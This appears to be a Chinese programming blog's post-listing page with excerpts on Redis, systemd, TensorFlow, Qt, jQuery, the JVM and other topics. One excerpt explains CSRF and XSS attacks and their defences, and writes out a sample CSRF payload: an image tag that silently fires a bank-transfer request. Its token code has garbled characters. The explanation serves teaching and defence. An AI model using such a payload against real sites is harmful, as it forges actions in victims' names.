<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f94d8fa6a6fbb04cd1fd399d6bfe2d31/" rel="bookmark">
			redis编译指定路径并带调试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		make CFLAGS="-g -O0" PREFIX=/usr/local/redis install
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c42cb412b01126ba33bc3c24c58b33e9/" rel="bookmark">
			认识系统服务（daemon）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于不同Linux发行版本，与systemd的daemon运行过程相关的目录路径可能会不一样 对于centos7：
/usr/lib/systemd/system/： 使用 CentOS 官方提供的软件安装后，默认的启动脚本配置文件都放在这里，这里的数据尽量不要修
改～ 要修改时，请到 /etc/systemd/system 底下修改较佳！ /run/systemd/system/： 系统执行过程中所产生的服务脚本，这些脚本的优先序要比 /usr/lib/systemd/system/ 高！ /etc/systemd/system/： 管理员依据主机系统的需求所建立的执行脚本，其实这个目录有点像以前 /etc/rc.d/rc5.d/Sxx 之类的功
能！ 执行优先序又比 /run/systemd/system/ 高喔！ /etc/sysconfig/*： 几乎所有的服务都会将初始化的一些选项设定写入到这个目录下，举例来说，mandb 所要更新的 man page
索引中，需要加入的参数就写入到此目录下的 man-db 当中喔！而网络的设定则写在 /etc/sysconfig/network-scripts/ 这个目录
内。所以，这个目录内的文件也是挺重要的； /var/lib/： 一些会产生数据的服务都会将他的数据写入到 /var/lib/ 目录中。举例来说，数据库管理系统 Mariadb 的数 据库默认就
是写入 /var/lib/mysql/ 这个目录下啦！ /run/： 放置了好多 daemon 的暂存档，包括 lock file 以及 PID file 等等。 对于Ubuntu16.04：
/lib/systemd/system/ 大多数 unit 的配置文件都放在这个目录下。 （主要是这里与Centos不同）
注意，在我们自己创建 unit 配置文件时，既可以把配置文件放在 /lib/systemd/system/ 目录下，也可以放在 /etc/systemd/system/ 目录下。
/etc/default/ 这个目录中放置很多服务默认的配置文件。
其他相同。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c42cb412b01126ba33bc3c24c58b33e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b46b2a79af1b2adb5584a701918ed6d/" rel="bookmark">
			初步了解TensorFlow如何实现正则化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为了避免过拟合问题，一个非常常用的方法是正则化（regularization），正则化的思想就是在损失函数中加入刻画模型复杂程度的指标。
假设用于刻画模型在训练数据上表现的损失函数为J(θ)，那么在优化时不是直接优化J(θ)，而是优化J(θ) + λR(w)，其中R(w)刻画的是模型的复杂程度，而λ表示模型复杂损失在总损失中的比例，需要注意的是，这里的θ表示的是一个神经网络中所有的参数，它包括边上的权重w和偏置项b，但一般来说模型复杂度只由权重w决定。
常用的刻画模型复杂度的函数R(w)有两种，一种是L1正则化，计算公式是：
另一种是L2正则化，计算公式是：
TensorFlow可以优化任意形式的损失函数，所以TensorFlow自然也可以优化带正则化的损失函数。
L1正则化和L2正则化，在TensorFlow中分别以不同的函数实现它们，以下列代码为示例：
#含有L1正则化的损失函数： loss = tf.reduce_mean(tf.square(y_ - y)) + tf.contrib.layers.l1_regularizer(λ)(w) #含有L2正则化的损失函数： loss = tf.reduce_mean(tf.square(y_ - y)) + tf.contrib.layers.l2_regularizer(λ)(w) loss为定义的损失函数，它由两个部分组成，第一个部分是均方误差损失函数，它刻画了模型在训练数据上的表现，第二个部分就是正则化，它防止模型过度模拟训练数据中的随机噪音；
λ表示了正则化项的权重，w为需要计算正则化损失的参数。
TensorFlow提供了tf.contrib.layers.l1_regularizer函数和tf.contrib.layers.l2_regularizer函数用来计算L1正则化和L2正则化，通过以下代码给出使用两个函数的样例：
import tensorflow as tf weights = tf.constant([[1.0, -2.0], [-3.0, 4.0]]) with tf.Session() as sess: #计算结果为5.0 print(sess.run(tf.contrib.layers.l1_regularizer(0.5)(weights))) #计算结果为15 * 1/2 = 7.5，L2正则化乘以1/2可以方便求导 print(sess.run(tf.contrib.layers.l2_regularizer(0.5)(weights))) 在简单的神经网络中，这样的方式就可以很好地计算带正则化的损失函数了，但当神经网络的参数增多之后，这样的方式首先可能导致损失函数loss的定义很长，可读性差且容易出错，更主要的是，当网络结构复杂之后定义网络结构的部分和计算损失函数的部分可能不在同一个函数中，这样通过变量这种方式计算损失函数就不方便了。
为了解决这个问题，可以使用TensorFlow中提供的集合（collection）来维护需要计算的正则化损失，以下列代码为示例给出通过集合计算一个5层神经网络带L2正则化的损失函数的计算方法：
import tensorflow as tf #获取一层神经网络边上的权重，并将这个权重的L2正则化损失加入名称为losses的集合中 def get_weight(shape, r): #生成一个变量 var = tf.Variable(tf.random_normal(shape, stddev=1, seed=1), dtype=tf.float32) '''add_to_collection函数将这个新生成变量的L2正则化损失项加入集合 这个函数的第一个参数losses是集合的名字，第二个参数是要加入这个集合的内容''' tf.add_to_collection('losses', tf.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b46b2a79af1b2adb5584a701918ed6d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/834bcd64c55ad16a0b29aede4101f295/" rel="bookmark">
			QT 和Ogre Demo
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		QT 和Ogre Demo
ogre的编译请参考链接https://blog.csdn.net/DdogYuan/article/details/79559667 或自行解决, 我用的vs2015 ,生成后将dll和头文件加入到QT的工程中即可（注意必须对应）
ogre自带的de'mo
参考链接:
http://wiki.ogre3d.org/Home
https://ogrecave.github.io/ogre/api/latest/tut__first_scene.html
该Demo使用的版本是ogre1.10.12 (32位) , Qt5.10.0 MSVC2015 32bit Release QT Creator 编译生成的
例程，完整ogre编译和使用步骤，
完整源码工程下载地址
https://download.csdn.net/download/gws09876/12136896
附qt ogreCamera操作类的代码，理解请看代码
#ifndef __SdkQtCameraMan_H__ #define __SdkQtCameraMan_H__ #include "OgreCamera.h" #include "OgreSceneNode.h" #include "OgreFrameListener.h" #include &lt;QKeyEvent&gt; #include &lt;QMouseEvent&gt; #include &lt;QDebug&gt; // enum CameraStyle should be in other namespace than OgreBites::CameraStyle namespace OgreQtBites { enum CameraStyle // enumerator values for different styles of camera movement { CS_FREELOOK, CS_ORBIT, CS_MANUAL }; /*============================================================================= | Utility class for controlling the camera in samples.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/834bcd64c55ad16a0b29aede4101f295/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b73830735eae15e005f78ff6bb54902a/" rel="bookmark">
			Jupyter-notebook隐藏代码（转载）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有时候我们需要将jupyter-notebook导出为一个报告或者presentation的形式，不需要显示代码过程，只需要显示结果以及用markdown做的解释说明。有几种方式可以实现这个功能。我把下面的代码写成了函数集成在我的sciplot库里面了。载请注明出处。
隐藏/显示代码按钮 在随便一个cell中加入以下代码并运行就可以得到一个按钮，点击它就可以实现隐藏和显示代码。在notebook中对所有代码起作用；但是对导出结果中只对hide所在cell起作用。
import ipywidgets as widgets from IPython.display import display, HTML javascript_functions = {False: "hide()", True: "show()"} button_descriptions = {False: "Show code", True: "Hide code"} def toggle_code(state): output_string = "&lt;script&gt;$(\"div.input\").{}&lt;/script&gt;" output_args = (javascript_functions[state],) output = output_string.format(*output_args) display(HTML(output)) def button_action(value): state = value.new toggle_code(state) value.owner.description = button_descriptions[state] state = False toggle_code(state) button = widgets.ToggleButton(state, description = button_descriptions[state]) button.observe(button_action, "value") display(button) 直接隐藏代码 同样在其中一个cell（建议放在最开始的一个cell中）中输入一下代码，这个在你自己编辑notebook时不起作用，对导出结果中所有代码起作用：导出html或者pdf中是没有代码的。同样把它定义为函数集成在sciplot里面方便调用。
from IPython.display import display from IPython.display import HTML import IPython.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b73830735eae15e005f78ff6bb54902a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13830ebd7f01e8da96c6540de2f78351/" rel="bookmark">
			jquery之each方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		jQuery.each()函数用于遍历指定的对象和数组，并以对象的每个属性(或数组的每个成员)作为上下文来遍历执行指定的函数。
所谓的上下文，意即该函数内部的this指针引用了该元素。
该函数属于全局jQuery对象。请注意，这与jQuery对象(实例)的each()函数不同。
语法 静态函数jQuery.each()的语法如下：
JavaScript:
jQuery.each( object, callback ) 参数 参数描述objectObject类型指定需要遍历的对象或数组。callbackFunction类型指定的用于循环执行的函数。 参数object可以是对象或数组。如果是对象，则遍历该对象的每个属性；如果是数组，则遍历该数组中的每个元素。 jQuery.each()函数将根据每个成员(对象的属性或数组的元素)循环调用函数callback。每次调用函数callback时，jQuery.each()函数都会将callback函数内部的this引用指向当前正在迭代的成员，并为其传入两个参数。第一个参数是当前迭代成员在对象或数组中的索引值(从0开始计数)，第二个参数是当前迭代成员(与this的引用相同)。 jQuery.each()的使用：
$.each()是对数组，json和dom结构等的遍历，说一下他的使用方法吧。
1、遍历一维数组
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;jq之each方法&lt;/title&gt; &lt;script src="jquery-2.0.3.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; //遍历一维数组 var arr1 = ['aa','bb','cc','dd']; $.each(arr1,function(i,value){ //两个参数，第一个参数表示遍历的数组的下标，第二个参数表示下标对应的值 console.log(i+'...'+value); }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 结果：
2、遍历二维数组 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;jq之each方法&lt;/title&gt; &lt;script src="jquery-2.0.3.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; //遍历二维数组 var arr2 = [['aa','bb'],['cc','dd'],['ee','ff']]; $.each(arr2,function(i,item){ //两个参数，第一个参数表示下标，第二个参数表示一维数组中的每一个数组 console.log(i+'...'+ item); }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 结果：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13830ebd7f01e8da96c6540de2f78351/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99de326196ba7ef820056183bcaec79e/" rel="bookmark">
			深入理解java虚拟机第三版第一章
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		深入理解java虚拟机这本书本书是以OpenJDK/OracleJDK中的HotSpot虚拟机为主脉络进行讲述
java杂谈 一般以javax.*作为包名，而以java.*为包名的包都是Java SE API的核心包，javaEE的扩展由于历史原因，一部分曾经是扩展包的API后来进入了核心包中，因此核心包中也包含了不少javax.*开头的包名。Sun公司发布了JDK 1.1，Java里许多最基础的技术支撑点（如JDBC等）都是在 JDK 1.1版本中提出它但诞生于名为“Longview Techno-logies”的小公司，后被sun公司收购成为jdk1.3的主流虚拟机2004年9月30日，JDK 5发布，工程代号为Tiger（老虎）。Sun公司从这个版本开始放弃了谦逊 的“JDK 1.x”的命名方式，将产品版本号修改成了“JDK x而JDK 5在Java语法易用性上做出了非常大的改进。如：自动装箱、泛型、动态注解、枚 举、可变长参数、遍历循环（foreach循环）等语法特性都是在JDK 5中加入的。在虚拟机和API层面上，这个版本改进了Java的内存模型（Java Memory Model，JMM）、提供了java.util.concurrent并发包 等。另外，JDK 5是官方声明可以支持Windows 9x操作系统的最后一个JDK版本。。JDK 6的改进包括：提供初步的动态语言支持（通过内置Mozilla JavaScript Rhino引擎实现）、提供编译期注解处理器和微型HTTP服务器API，等等。同时，这个版本对Java虚拟 机内部做了大量改进，包括锁与同步、垃圾收集、类加载等方面的实现都有相当多的改动。JDK 7包含的改进有：提供新的G1收 集器（G1在发布时依然处于Experimental状态，直至2012年4月的Update 4中才正式商用）、加强对非 Java语言的调用支持（JSR-292，这项特性在到JDK 11还有改动）、可并行的类加载架构等。JDK 8包含的改进有：对Lambda表达式的支持，这让Java语言拥有了流畅的函数式表达能力，内置Nashorn JavaScript引擎的支持. ·新的时间,日期API，彻底移除HotSpot的永久代有LTS版的JDK能够获得为期三年的支持和更新，普通版的 JDK就只有短短六个月的生命周期。JDK 8和JDK 11会是LTS版，再下一个就到2021年发布的JDK 17 了Oracle正式 宣告Java EE成为历史名词。虽然Java SE、Java EE和Java ME三条产品线里确实只有Java SE称得上成 功，但Java EE毕竟无比辉煌过，现在其中还持有着JDBC、JMS、Servlet等使用极为广泛的基础组件， 然而Oracle仍选择把它“扫地出门”，所有权直接赠送给Eclipse基金会，唯一的条件是以后不准再使 用“Java”这个商标[14]，所以取而代之的将是Jakarta EE。 虚拟机 这块内容主要讲了hotspot发展史和其他虚拟机的介绍和历史
最后提到了 Graal vm无语言倾向虚拟机概念，他是在hotspot基础上的增强，可以运行任何语言
编译虚拟机 系统环境：ubuntu16.04
jdk9源码地址：http://hg.openjdk.java.net/jdk9
译JDK需要指定一个Bootstrap JDK，因为OpenJDK的各个组成部分有的是用C++编写的，更多的代码则是使用Java自身实现的。所以需要去JDK官网下载一份JDK，编译jdk9要下载jdk8或9，编译jdk8要下载jdk8或7以此类推
jdk8的gz压缩包：链接：https://pan.baidu.com/s/1HxOwgXXeAx63AhoV7zTs9w 提取码：nz53
1.获取源码，这里建议编译jdk9
apt-get install mercurial hg clone http://hg.openjdk.java.net/jdk9/jdk9/ 会生产一个jdk9目录 cd 到jdk9目录，执行命令获取剩下的源码
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99de326196ba7ef820056183bcaec79e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcca047823a34e19bd106d5f47be18dd/" rel="bookmark">
			第八届蓝桥杯第八题--包子凑数（C语言）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第八届蓝桥杯第八题–包子凑数（C语言） 一.比赛题目 1.题目要求 小明几乎每天早晨都会在一家包子铺吃早餐。他发现这家包子铺有N种蒸笼，其中第i种蒸笼恰好能放Ai个包子。每种蒸笼都有非常多笼，可以认为是无限笼。
每当有顾客想买X个包子，卖包子的大叔就会迅速选出若干笼包子来，使得这若干笼中恰好一共有X个包子。比如一共有3种蒸笼，分别能放3、4和5个包子。当顾客想买11个包子时，大叔就会选2笼3个的再加1笼5个的（也可能选出1笼3个的再加2笼4个的）。
当然有时包子大叔无论如何也凑不出顾客想买的数量。比如一共有3种蒸笼，分别能放4、5和6个包子。而顾客想买7个包子时，大叔就凑不出来了。
小明想知道一共有多少种数目是包子大叔凑不出来的。
2.输入与输出 输入：
第一行包含一个整数N。(1 &lt;= N &lt;= 100)以下N行每行包含一个整数Ai。(1 &lt;= Ai &lt;= 100)
输出：
一个整数代表答案。如果凑不出的数目有无限多个，输出INF
样例输入1：
2
4
5
样例输出1：
6
样例输入2：
2
4
6
样例输出2：
INF
二.分析过程 为了做懂这道题，这两天一直在看背包问题，终于在今晚上把背包问题稍微总结了一下：总结的背包问题
1.问题分析 这个包子凑数问题首先要解决两个难点：
（1）在什么情况下，包子凑不出来的数目是无限个；
（2）如何知道包子能凑出哪些数目；
第二个问题其实就是背包问题的一种变形
2.第一个问题 第一个问题的关键其实就是知道假如输入的每笼包子的数目不互质的话，包子凑不出来的数目就是无限个；
一直反复来求两个数的公约数，假如最后不是1，那么就说这两个数不互质，求出两个数的最大公约数之后在和后面的数又进行比较，
gcd函数返回两个或多个整数的最大公约数
这就是下面代码的含义：
int gcd(int a, int b) { return b == 0 ? a : gcd(b, a%b); } 3.第二个问题 包子凑数里面说了笼数是无穷笼，所以可以利用完全背包里面的转移方程来解决：
for(int i=1;i&lt;=n;i++) for(int j=0;j&lt;=h;j++) if(j&gt;=w[i]) dp[j]=max(dp[j],dp[j-w[i]]+v[i]); //完全背包的转移方程 在结合本题的实际情况下，对转移方程代码进行改动：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fcca047823a34e19bd106d5f47be18dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9e7572ba4a7c4957d03661d90c52ad1/" rel="bookmark">
			数据结构与算法课程设计大作业
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		考 核 要 求
课程编号： 400802010 课程名称： 数据结构与算法课程设计 考试形式： 大作业 大作业1-9见我的下载 里面包含多个版本的设计 文件有cpp文件设计文档总结等
一、设计考核说明：
学生必须仔细阅读《数据结构》课程设计方案，认真主动完成课设的要求。有问题及时主动与教师沟通。
学生要发挥自主学习的能力，充分利用时间，安排好课设的时间计划，并在课设过程中不断检测自己的计划完成情况，及时的向教师汇报。
课程设计按照教学要求需要一周时间完成。
二、具体要求：
1.学生在选题范围中选择设计题目，选题根据学号的尾号定题目，例如尾号为1的选择第一题，以此类推，尾号为0和9的选第九题。
2.学生单独进行相应软件项目的设计、实现工作，独立提交完整文档。
3.提交文档雷同，第2名及以后作不及格处理。
4.要求按照系统设计规范来撰写设计报告。报告包括封面（项目的题目、姓名等）、目录、主体设计部分以及后记。文档每人一份。
5.要求内容完整，结构清晰，最终提交电子文档一份。
三、设计题目选题表
1、运动会分数统计问题。
【问题描述】
参加运动会有n个学校，学校编号为1„„n。比赛分成m个男子项目，和w个女子项目。项目编号为男子1„„m，女子m+1„„m+w。不同的项目取前五名或前三名积分；取前五名的积分分别为：7、5、3、2、1，前三名的积分分别为：5、3、2；哪些取前五名或前三名由学生自己设定。（m&lt;=20,n&lt;=20）。
【实现要求】
（1）可以输入各个项目的前三名或前五名的成绩；
（2）能统计各学校总分；
（3）可以按学校编号、学校总分、男女团体总分排序输出；
（4）可以按学校编号查询学校某个项目的情况；可以按项目编号查询取得前三或前五名的学校；
（5）数据存入文件并能随时查询；
（6）输入数据形式和范围：可以输入学校的名称，运动会项目的名称。
【实现提示】
输出有中文提示，各学校分数为整形；每个功能可以设立菜单，用户根据提示实现相关功能；存储结构可采参考图的邻接表，自行设计。设计报告中应有数据测试部分说明。 代码：https://download.csdn.net/download/sereasuesue/12530524
2、学生成绩管理系统
【问题描述】
现有学生成绩信息文件1（1.txt），内容如下
姓名 学号 语文 数学 英语 张明明 01 67 78 82
李成友 02 78 91 88
张辉灿 03 68 82 56
王露 04 56 45 77
陈东明 05 67 38 47
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9e7572ba4a7c4957d03661d90c52ad1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6215f9d40f8d5267c9d45b703ebbee59/" rel="bookmark">
			csrf与xss攻击的详解与区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、csrf攻击
1.CSRF的基本概念、缩写、全称：CSRF(Cross-site request forgery)：跨站请求伪造。
2.CSRF的攻击原理
用户是网站A的注册用户，且登录进去，于是网站A就给用户下发cookie。从上图可以看出，要完成一次CSRF攻击，受害者必须满足两个必要的条件：
（1）登录受信任网站A，并在本地生成Cookie。（如果用户没有登录网站A，那么网站B在诱导的时候，请求网站A的api接口时，会提示你登录）
（2）在不登出A的情况下，访问危险网站B（其实是利用了网站A的漏洞）。
注意cookie保证了用户可以处于登录状态，但网站B其实拿不到cookie。
3.CSRF的危害?-发消息(蠕虫)+转账(丢钱)+盗号
攻击者能够欺骗受害用户完成该受害者所允许的任一状态改变的操作，CRSF能做的事情包括利用你的身份发邮件、发短信、进行交易转账等，甚至盗取你的账号，更新账号细节，完成购物，注销甚至登录等操作，获取用户的隐私数据，配合其他漏洞攻击CSRF蠕虫指产生蠕虫效果，会将 CSRF 攻击一传十，十传百。如：某社区获取好友列表接口和私信好友的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大！
假设某银行网站A以GET请求来发起转账操作，转账的地址www.xxx.com/transfer.doaccountNum=l000l&amp;money=10000，参数accountNum表示转账的账户，参数money表示转账金额。而某大型论坛B上，一个恶意用户上传了一张图片，而图片的地址栏中填的并不是图片的地址，而是前而所说的砖账地址：&lt;img src="http://www.xxx.com/transfer.do?accountNum=l000l&amp;money=10000"&gt;当你登录网站A后，没有及时登出，这时你访问了论坛B，不幸的事情发生了，你会发现你的账号里面少了10000块...为什么会这样呢，在你登录银行A时，你的浏览器端会生成银行A的cookie，而当你访问论坛B的时候，页面上的&lt;img&gt;标签需要浏览器发起一个新的HTTP请求，以获得图片资源，当浏览器发起请求时，请求的却是银行A的转账地址www.xxx.com/transfer.do?accountNum=l000l&amp;money=10000，并且会带上银行A的cookie信息，结果银行的服务器收到这个请求后，会以为是你发起的一次转账操作，因此你的账号里边便少了10000块。
4.CSRF如何防御?---cookie设置httpOnly + token验证 + 隐藏令牌 + Referer验证
（1）方法1、将cookie设置为HttpOnly
CRSF攻击很大程度上是利用了浏览器的cookie，为了防止站内的XSS漏洞盗取cookie,需要在cookie中设置“HttpOnly”属性，这样通过程序（如JavaScript脚本、Applet等）就无法读取到cookie信息，避免了攻击者伪造cookie的情况出现。设置cookie为HttpOnly的代码如下：response.setHeader( "Set-Cookie", "cookiename=cookievalue;HttpOnly");
（2）方法2、Token 验证(用的最多)：攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于cookie中，因此攻击者可以在不知道用户验证信息的情况下直接利用用户的cookie来通过安全验证。在请求中放入攻击者所不能伪造的信息，并且该信总不存在于cookie之中。服务器发送给客户端一个token；客户端提交的表单中带着这个token；如果这个token不合法，那么服务器拒绝这个请求。假设请求通过POST方式提交，则可以在相应的表单中增加一个隐藏域：
&lt;input type="hidden" name="_toicen" value="tokenvalue"/&gt;
token的值通过服务端生成，表单提交后token的值通过POST请求与参数一同带到服务端，每次会话可以使用相同的token，会话过期，则token失效，攻击者因无法获取到token，也就无法伪造请求。
在session中添加token的实现代码：
HttpSession session = request.getSession(); Object token = session.getAttribute("_token"); if(token == null I I "".equals(token)) { session.setAttribute("_token", UUID.randomUUIDO .toString()); } （3）方法3、隐藏令牌：把token隐藏在http的head头中。方法二和方法一有点像，本质上没有太大区别，只是使用方式上有区别。
（4）方法4、Referer验证：Referer指的是页面请求来源。意思是，只接受本站的请求，服务器才做响应；如果不是，就拦截。
二、xss攻击
1、XSS的基本概念：XSS（Cross Site Scripting）：跨域脚本攻击。
2、XSS攻击原理：不需要你做任何的登录认证，它会通过合法的操作（比如在url中输入、在评论框中输入），向你的页面注入脚本（可能是js、hmtl代码块等）。
3、XSS攻击后果：盗用Cookie破坏页面的正常结构，插入广告等恶意内容D-doss攻击
4、XSS的攻击方式，具体详见：反射型XSS漏洞的条件+类型+危害+解决
a. 反射型：发出请求时，XSS代码出现在url中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以叫反射型XSS。
b.存储型：存储型XSS和反射型XSS的差别在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求时目标页面时不用再提交XSS代码。
5、XSS的防范措施（encode+过滤）
XSS的防范措施主要有三个：编码、过滤、校正
1、编码：对用户输入的数据进行HTML Entity 编码。把字符转换成 转义字符。Encode的作用是将$var等一些字符进行转化，使得浏览器在最终输出结果上是一样的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6215f9d40f8d5267c9d45b703ebbee59/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c193fde9cffc89fe003cea2b51285b16/" rel="bookmark">
			如何进行断点调试？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用任意浏览器打开写好的html文件，然后按F12（右击选择“检查”）
就会看到如上图片内容，点击Sources，然后在想打断点的地方轻轻点击一下
这个时候F5刷新一下就可以，开始断点调试了！
1：跳转到下一个断点处
2：单步执行
3. 进入函数
4. 跳出函数
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/323226db3859eb3fbd991ac00f43aa86/" rel="bookmark">
			解决vmware安装黑苹果无法上网的问题(win10)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先设置网络连接为NAT模式
打开控制面板中的网络连接
找到VMnet8的连接右键属性--&gt;共享--&gt;1、勾选允许其他网络用户通过此计算机的Internet连接来连接 2、选择VMnet1
3、确定--保存
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b44cf99454fb6888d4de9cbf33d3ef4/" rel="bookmark">
			Qt学习笔记之 字符串类型小结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. Qt常用字符串类型 1.1 QString QString是Unicode编码的字符串，存储一系列16位的QChar，每一个QChar对应一个Unicode 4.0编码的字符，详见《Qt学习笔记之QString》。
1.2 QByteArray QByteArray是个字节数组，可以存储原始字节（包括一系列'\0')和传统的8位'\0'结尾的字符串，每一个字节存储为char类型的数据；
虽然QString用得更普遍和方便，但当需要存储原始的二进制数据或者内存保护要求严格时，用QByteArray比用QString更合适，详见《Qt学习笔记之QByteArry》。
1.3 QChar QChar存储一个16位（2个字节）的Unicode字符，数据的存储类型为ushort（unsigned short），详见《Qt学习笔记之QChar》。
1.4 QLatin1Char QLatin1Char是个结构体，存储一个8位ASCII/Latin-1编码的字符，数据的存储类型为char，详见《Qt学习笔记之QLatin1Char》。
2. Qt字符串类型见转换 2.1 QByteArray、char *与QString互转 QByteArray与QString互转极为简单，二者从本质上类似，都是连续存储，区别是前者可以存无法显示的字符，后者只存可显示的字符。如QByteArray可以存0x00-0x19，而QString则存储如0x30等可显示字符（0x20-0x7E）
QString 转 char ，需要用到 QByteArray 类， 因为 char 最后都有一个'\0'作为结束符，而采用 QString::toLatin1() 时会在字符串后面加上'\0'。
#include &lt;QCoreApplication&gt; #include &lt;QChar&gt; #include &lt;QString&gt; #include &lt;QDebug&gt; int main(int argc, char *argv[]) { QCoreApplication a(argc, argv); //! QString 定义 QString str = "hello world"; //! QString 转 QByteArray QByteArray ba; ba = str.toLatin1(); qDebug("%s",ba.data()); //!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5b44cf99454fb6888d4de9cbf33d3ef4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ed1e7e985de47c8ede456f776c30b01/" rel="bookmark">
			小程序-转发功能，使用button开放功能open-type=&#34;share&#34;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 页面内发起转发
通过给 button 组件设置属性 open-type="share"，可以在用户点击按钮后触发 Page.onShareAppMessage 事件，相关组件：button。
&lt;button open-type="share"&gt;转发&lt;/button&gt; // 3 button 的开放功能&lt;button open-type="share"&gt;分享&lt;/button&gt; onShareAppMessage: function(res) { var that = this; //console.log('res=====',res); if (res.from === 'button') { //console.log('来自页面内转发按钮'); } else if (res.from === 'menu'){ //console.log('右上角菜单转发按钮'); } // 返回数据 return { title: that.data.info.name, path: '/pages/food/info?id=' + that.data.info.id, success: function(res) { // 转发成功，可以把当前页面的链接发送给后端，用于记录当前页面被转发了多少次或其他业务 wx.request({ url: app.buildUrl("/member/share"), data: { url: utils.getCurrentPageUrlWithArgs() }, success: function(res) { //console.log('成功'); } }); }, fail: function(res) { // 转发失败 } } }, 
	</div>
</article><article class="list__item post">
	
